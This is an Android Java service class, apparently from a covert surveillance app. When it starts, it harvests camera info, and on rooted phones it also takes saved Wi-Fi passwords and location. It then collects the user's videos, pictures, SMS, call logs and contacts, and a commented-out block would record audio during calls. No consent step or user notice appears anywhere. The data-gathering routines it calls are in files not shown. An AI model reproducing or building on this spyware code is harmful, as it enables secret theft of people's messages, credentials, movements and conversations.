package com.fs.fs.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.amap.api.location.AMapLocation;
import com.fs.fs.api.DeviceService;
import com.fs.fs.api.LocationService;
import com.fs.fs.api.ProviderService;
import com.fs.fs.utils.DeviceUtils;
import com.fs.fs.utils.NetworkUtils;

/**
 * Created by wyx on 2017/1/7.
 */

public class AppService extends Service {
    // TODO: SharePreferencesUtils 保存基本设定  SharePreferencesUtils 对比原有新增等
    // TODO: Receiver 生命进程
    // TODO: 安装 更新Service
    @Override
    public void onCreate() {
        super.onCreate();
        if (NetworkUtils.isNetworkAvailable(this)) {
            DeviceService.getCameraInfo();
            if (DeviceUtils.isRoot()) {
                // Get wifi password and the locate
                DeviceService.getWifiPasswd();
                LocationService.getInstance().once(new LocationService.LocateListener() {
                    @Override
                    public void onLocateSucceed(AMapLocation aMapLocation) {

                    }

                    @Override
                    public void onLocateFail(int errorCode, String errorInfo) {

                    }
                });
            }
            ProviderService.getInstance().getVideos();
            ProviderService.getInstance().getPictures();
            ProviderService.getInstance().getSMS();
//            new ProviderService.CallsListener() {
//                @Override
//                public void onGetAllCall(List<PhoneInfo> callInfo) {
//
//                }
//
//                @Override
//                public void onStart() {
//                    MediaRecordService.sendMessage(MediaRecordService.START_AUDIO);
//                }
//
//                @Override
//                public void onFinish() {
//                    MediaRecordService.sendMessage(MediaRecordService.STOP_AUDIO);
//                }
//
//                @Override
//                public Boolean onPhoneNumber(String number) {
//                    return true;
//                }
//            }
            ProviderService.getInstance().getCalls();
            ProviderService.getInstance().getContant();
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LocationService.getInstance().close();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
